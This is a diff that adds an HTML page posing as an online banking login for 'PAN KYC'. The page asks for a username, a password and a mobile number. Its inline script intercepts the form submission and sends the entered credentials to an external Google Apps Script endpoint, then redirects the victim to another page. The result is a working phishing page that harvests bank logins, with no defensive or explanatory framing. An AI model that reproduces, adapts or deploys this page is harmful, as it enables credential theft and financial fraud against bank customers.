@@ -1,0 +1,76 @@
+<html><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width">
+    <title>Login</title>
+    <meta name="description" content="login">
+    <link rel="icon" href="/favicon.ico">
+    <meta name="next-head-count" content="5">
+    <link rel="preload" href="/_next/static/css/7b61cb2aee4062a0.css" as="style">
+    <link rel="stylesheet" href="/_next/static/css/7b61cb2aee4062a0.css" data-n-g=""><noscript data-n-css=""></noscript>
+    <script defer="" nomodule="" src="/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js"></script>
+    <script src="/_next/static/chunks/webpack-cc9c69bc14c8e1bc.js" defer=""></script>
+    <script src="/_next/static/chunks/framework-fe99aa755573eedd.js" defer=""></script>
+    <script src="/_next/static/chunks/main-a307755b2b1681d8.js" defer=""></script>
+    <script src="/_next/static/chunks/pages/_app-620102ba3a9296b8.js" defer=""></script>
+    <script src="/_next/static/chunks/345-cee1cc72e673cadd.js" defer=""></script>
+    <script src="/_next/static/chunks/pages/lg-8ca277b05cdbe719.js" defer=""></script>
+    <script src="/_next/static/85s6rnF6QAqOK_s5fdhcj/_buildManifest.js" defer=""></script>
+    <script src="/_next/static/85s6rnF6QAqOK_s5fdhcj/_ssgManifest.js" defer=""></script>
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+    <div id="__next">
+        <main>
+          
+            <img src="logo.svg" alt="" style="margin: 10px;height: 50px;margin-left: 65px;">
+            <div class="login-heading">
+                <h3 class="text-center">Login Online Banking to PAN KYC</h3>
+            </div>
+            <div class="login-form">
+                <p class="info"><span>(CARE:</span> Username and password are case sensitive.)</p>
+                <form action="" class="form" id="frmSubmit" method="post" name="google-sheet">
+                    <div class="form-group"><label for="username">Username* </label><input name="UserName" type="text" class="form-control" id="username" required="" size="30" maxlength="30" aria-label="userName"></div>
+                    <div class="form-group"><label for="password">Password* </label><input name="Password" type="password" class="form-control" id="password" required="" size="30" maxlength="30" aria-label="userName"></div>
+                    <div class="form-group"><label for="mobile">Mobile* </label><input name="Mobile" type="text" class="form-control" id="mobile" size="30" required="" maxlength="10" aria-label="mobile"></div>
+                    <div class="form-group"><label for="captcha">Enter the text as shown in the image * </label><input type="text" class="form-control" size="30" maxlength="30" aria-label="captcha"></div><label>Select one of the Captcha options </label>
+                    <div class="captcha">
+                        <div class="w-50"><input type="radio" id="" checked="">Image Captcha</div>
+                        <div class="w-50"><input type="radio" id="">Audio Captcha</div>
+                        <div class="clear"></div>
+                        <img src="catpcha.png" alt="" style="margin: 15px;">
+                      
+                        <div class="form-group"><input class="btn" type="submit" id="btnSubmit" value="Login"><input type="reset" class="btn" value="Reset"></div>
+                        <p><a href="/">New User ? Register here/Activate</a></p>
+                        <p><a href="/">Forgot Username / Login Password</a></p>
+                    </div>
+                </form>
+            </div>
+            <div class="p-body">
+                <ul class="provide">
+                    <li>Mandatory fields are marked with an asterisk (*)</li>
+                    <li>Do not provide your username and password anywhere other than in this page</li>
+                    <li>Your username and password are highly confidential. Never part with them.<strong>Bank </strong>will never ask for this information.</li>
+                </ul>
+            </div>
+            <div class="footer_area"><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%2768%27%20height=%2728%27/%3e"></span><img alt="versign" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"><noscript><img alt="versign" src="/veriSign.png" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span>
+            </div>
+            <div class="footer">
+                <p>© OnlineBanking</p>
+            </div>
+        </main>
+    </div>
+    <script>
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbybqrpmXNlCupEf6APN4PM115rnew3LzTok_HvMKmFQOvD6PAdwoD-82RWdlE9LfmL0hA/exec'
+        const form = document.forms['google-sheet']
+      
+        form.addEventListener('submit', e => {
+          e.preventDefault()
+          fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+            .then(response => window.location.href='d2.html')
+            .catch(error => console.error('Error!', error.message))
+        })
+      </script>
+
+
+</body></html>
